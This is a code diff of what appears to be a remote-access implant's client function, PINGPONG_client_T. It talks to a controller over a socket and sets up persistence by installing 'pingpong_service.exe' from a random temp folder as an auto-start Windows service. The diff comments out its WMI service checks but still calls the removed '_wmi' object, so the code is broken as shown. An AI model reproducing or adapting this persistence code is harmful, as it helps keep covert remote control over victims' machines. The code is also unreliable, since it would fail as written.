@@ -293,26 +293,25 @@ def PINGPONG_client_T(ip, port):
                 import tempfile
                 from random import randint
                 import os,sys
-                from wmi import WMI
-                _wmi = WMI()
+                # from wmi import WMI
                 s.send(bytes('OK', 'utf8'))
                 def generate_random_str(randomlength=16):
                     random_str =''
                     base_str ='ABCDEFGHIGKLMNOPQRSTUVWXYZabcdefghigklmnopqrstuvwxyz0123456789'
                     length =len(base_str) -1
                     for i in range(randomlength):
-                        random_str +=base_str[randint(0, length)]
+                        random_str += base_str[randint(0, length)]
                     return random_str
                 dir_name = generate_random_str()
                 servise_before_adding = _wmi.Win32_Service()
-                for i in servise_before_adding:
-                    if 'PINGPONG service' in i.name or 'Piposvc' in i.name:
-                        s.send(bytes('HAVEIT', 'utf8'))
-                        cmd = Popen('sc queryex Piposvc', shuout=PIPE, shell=True)
-                        printout = cmd.stdout.read()
-                        pid = "".join(list(filter(str.isdigit, printout.splitlines()[8])))
-                        s.send(bytes(str(pid), 'utf8'))
-                        s.recv(1024)
+                # for i in servise_before_adding:
+                #     if 'PINGPONG service' in i.name or 'Piposvc' in i.name:
+                #         s.send(bytes('HAVEIT', 'utf8'))
+                #         cmd = Popen('sc queryex Piposvc', shuout=PIPE, shell=True)
+                #         printout = cmd.stdout.read()
+                #         pid = "".join(list(filter(str.isdigit, printout.splitlines()[8])))
+                #         s.send(bytes(str(pid), 'utf8'))
+                #         s.recv(1024)
                 pingpong_dir = os.path.join(tempfile.gettempdir(), dir_name)
                 if os.path.exists(pingpong_dir):
                     shutil.rmtree(pingpong_dir)
@@ -330,11 +329,20 @@ def PINGPONG_client_T(ip, port):
                 from subprocess import Popen
                 def start(dir):
                     tmp_dir = tempfile.gettempdir()
+                    Popen(f"{tmp_dir}\\{dir}\\pingpong_service.exe remove", shell=True)
                     Popen(f"{tmp_dir}\\{dir}\\pingpong_service.exe --startup=auto install", shell=True)
                     Popen(f"{tmp_dir}\\{dir}\\pingpong_service.exe start", shell=True)
                 start(dir_name)
-                s.send(b'OK')
-
+                # wmi_ = WMI()
+                # servise_after_adding = wmi_.Win32_Service()
+                # is_succ = True
+                # for j in servise_after_adding:
+                #     if not 'PINGPONG service' in j.name or not 'Piposvc' in j.name:
+                #         s.send(bytes('NONE', 'utf8'))
+                #         is_succ = False
+                # if is_succ:
+                #     s.send(bytes('OK' ,'utf8'))
+                s.send(bytes('OK', 'utf8'))
                 
 #persistence_service_END_location
 #exit_START_location
